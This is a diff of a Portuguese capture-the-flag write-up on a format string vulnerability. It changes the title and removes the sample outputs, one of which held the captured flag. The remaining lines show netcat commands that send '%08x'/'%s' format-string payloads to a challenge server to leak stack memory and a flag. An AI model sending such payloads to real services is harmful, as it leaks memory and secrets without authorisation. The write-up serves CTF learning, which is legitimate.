@@ -1,4 +1,4 @@
-# **Exploração de Vulnerabilidade de Format String – Passo a Passo**
+# **PWN**
 
 **Autor**: Hakal  
 **Desafio**: PWN - Exploração de Binário Vulnerável  
@@ -41,12 +41,6 @@ Executamos o seguinte comando:
 echo -e '%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x' | nc suspicious-strings.chapeudepalhahacker.club 62345
 ```
 
-**Saída:**
-
-```
-ae78a4d1.fbad2088.51875b2f.ae78a500.00000000.35ebe238.00c00000.00010000
-```
-
 ![Exploração da Pilha com Format String](1.png)
 
 
@@ -60,12 +54,6 @@ Utilizamos o seguinte comando:
 
 ```bash
 echo -e '%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%s' | nc suspicious-strings.chapeudepalhahacker.club 62345
-```
-
-**Saída:**
-
-```
-ae78a4d1.fbad2088.51875b2f.ae78a500.00000000.35ebe238.00c00000.00010000.ae7892a0.flag{f0rm4t_str1ng_1s_4w3s0m3}
 ```
 
 **Análise:**
